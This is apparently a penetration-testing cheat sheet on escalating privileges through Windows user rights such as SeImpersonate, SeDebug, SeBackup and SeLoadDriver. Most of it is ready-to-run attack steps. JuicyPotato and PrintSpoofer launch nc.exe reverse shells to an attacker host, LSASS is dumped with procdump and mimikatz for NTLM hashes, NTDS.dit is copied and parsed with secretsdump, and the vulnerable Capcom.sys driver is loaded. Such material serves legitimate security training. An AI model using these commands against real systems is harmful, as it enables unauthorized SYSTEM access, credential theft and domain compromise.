# Excessive User Rights Abuse

## Disclaimer - Disabled Rights

> * User privileges can be `assigned but disabled`.
> * Some of them can be `re-enabled` using scripts or commands depending on the privilege.

## **SeImpersonate & SeAssignPrimaryToken - JuicyPotato &  Printspoofer**

> * These privileges can be used to trick a process running as `SYSTEM` to connect to the exploit process, handing over the token to be used.
> * In other words, whenever a user has one of these privileges, it's possible to get privilege escalation by impersonating `NT AUTHORITY\SYSTEM`

### **Escalating Privileges with JuicyPotato**

1. Download juicypotato and nc.exe on the target machine
2. Check CLSIDs:
   1. Use `systeminfo` to get the OS version
   2. Select the right list according to the OS Version from [Juicy Potato CLSIDs](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
   3. Download the `test_clsid.bat` file from the [JuicyPotato GitHub](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)
   4. Run `test_clsid.bat` and wait, then check the `result.log` file
   5. Inside that log file you will find different CLSIDs.
   6. Look for a CLSID with SYSTEM privileges
3. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
4. Run JuicyPotato: `.\juicypotato.exe -l SAMEPORT -c CLSID_SYSTEM_FROM_RESULTS -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe attacker-ip SAME-LISTENING-PORT" -t *`
5. Disclaimer/Troubleshooting: the listening netcat port and the port specified after the `-l` flag need to be the same in order to get the reverse shell

***

### **Escalating Privileges with PrintSpoofer**

> * JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
> * PrintSpoofer and RoguePotato can be used on them to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.

* We can use the tool to spawn a SYSTEM process in the current console, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell
* PoC to get a Reverse Shell:
  1. Download `printspoofer.exe` and `nc.exe` on the target machine
  2. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
  3. Run PrintSpoofer: `PrintSpoofer.exe -c "c:\tools\nc.exe attacker-ip netcat-port -e cmd"`

***

## **SeDebugPrivilege**

> * SeDebugPrivilege determines which users can attach to or open any process, even a process they do not own.
> * Developers who are debugging their applications **DO NOT need** this user right.
> * Developers who are debugging new system components **need** this user right.
> * This user right provides access to sensitive and critical operating system components.
> * This user right can be used to capture sensitive information from system memory, or access/modify kernel and application structures
> * Sometimes, developer users are assigned the debugprivilege rather than being added to the administrators group, who have this privilege by default

#### **SeDebugPrivilege to Dump LSASS**

1. Use ProcDump to extract a dump of the LSASS process:\
   `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
2. Using `mimikatz.exe`:
   * `sekurlsa::minidump`
   * `sekurlsa::logonPasswords`
   * Gain the `NTLM Hashes` to use for a `Pass the Hash` attack or to `crack` them

***

#### **SeDebugPrivilege to gain Remote Code Execution as SYSTEM**

1. Get this [PoC Script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) on the target system
2. Open an elevated powershell console (e.g. right click on PS and run as admin)
3. Run `tasklist` and look for a privileged process (e.g. `winlogon.exe`) and get its `PID`
4. Run the script:\
   `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`
5. Alternatively:
   1. `Import-Module .\psgetsys.ps1`
   2. `ImpersonateFromParentPid -ppid (Get-Process "lsass").Id -command "C:\tools\revshell.exe"`

***

## **SeTakeOwnershipPrivilege**

> SeTakeOwnershipPrivilege is a `policy setting` that determines which users can take ownership of any securable object

* Check target file current ownership
  * **PowerShell:** `Get-ChildItem -Path 'C:\Path\to\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }`
  * **CMD:** `cmd /c dir /q 'C:\Path\to\file.txt'`
  * **Disclaimer:** Sometimes the owner won't show due to lack of permissions
* To **take ownership** of a file: `takeown /f 'C:\Path\to\file.txt'`
* To enable **full permissions** on a file: `icacls 'C:\Path\to\file.txt' /grant htb-student:F`

***

## **SeBackupPrivilege**

> * A user with SeBackupPrivilege enabled can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.
> * This will let us copy a file from a folder, bypassing any access control list (ACL).
> * However, we can't do this using the standard copy command.
> * Instead, we need to programmatically copy the data, making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.
> * We can use the built-in `robocopy` tool or the following `PoC` to copy any file: https://github.com/giuliano108/SeBackupPrivilege

***

#### **SeBackupPrivilege to Copy any file**

1. `Import-Module .\SeBackupPrivilegeUtils.dll`
2. `Import-Module .\SeBackupPrivilegeCmdLets.dll`
3. If the privilege is assigned but disabled, use `Set-SeBackupPrivilege` and verify with `Get-SeBackupPrivilege`
4. Copy a file: `Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`

***

#### **SeBackupPrivilege to Copy any file with robocopy \[Built-in Utility]**

* Robocopy is a built-in utility that can be used to copy files in backup mode.
* No external tools are required
* `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`

***

#### **SeBackupPrivilege to copy NTDS.dit**

> * The NTDS.dit file is locked by default
> * We can use the Windows `diskshadow` utility to **create a shadow copy** of the C drive and expose it as E drive.
> * The NTDS.dit in this shadow copy won't be in use by the system.
> * Then, we can use the `Copy-FileSeBackupPrivilege cmdlet` to bypass the ACL and copy the NTDS.dit locally.

Follow these steps:

1. `Import-Module .\SeBackupPrivilegeUtils.dll`
2. `Import-Module .\SeBackupPrivilegeCmdLets.dll`
3. If the privilege is assigned but disabled, use `Set-SeBackupPrivilege` and verify with `Get-SeBackupPrivilege`
4. Copy the NTDS file: `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
5. Extract hashes using SecretsDump: `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`

***

## **SeLoadDriverPrivilege**

> * This policy setting determines which users can dynamically load and unload device drivers.
> * This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device
> * Device drivers run as highly privileged code.

**Example - Capcom.sys**

* A typically vulnerable driver to this attack is Capcom.sys, which can allow any user to execute shellcode with SYSTEM privileges
* Download on the target machine: [Capcom.sys file](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* Download EopLoadDriver and transfer on the target machine: [EopLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
* PoC Usage: `EOPLOADDRIVER.exe RegistryServicePath DriverImagePath`
* PoC Usage with CapCom.sys: `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\path-to-downloaded\Capcom.sys`

***

## **SeSecurityPrivilege**

* This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys.
* These objects specify their system access control lists (SACL).
* A user assigned this user right can also view and clear the Security log in Event Viewer.

***

## **SeRestorePrivilege**

* This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories.
* It determines which users can set valid security principals as the owner of an object.
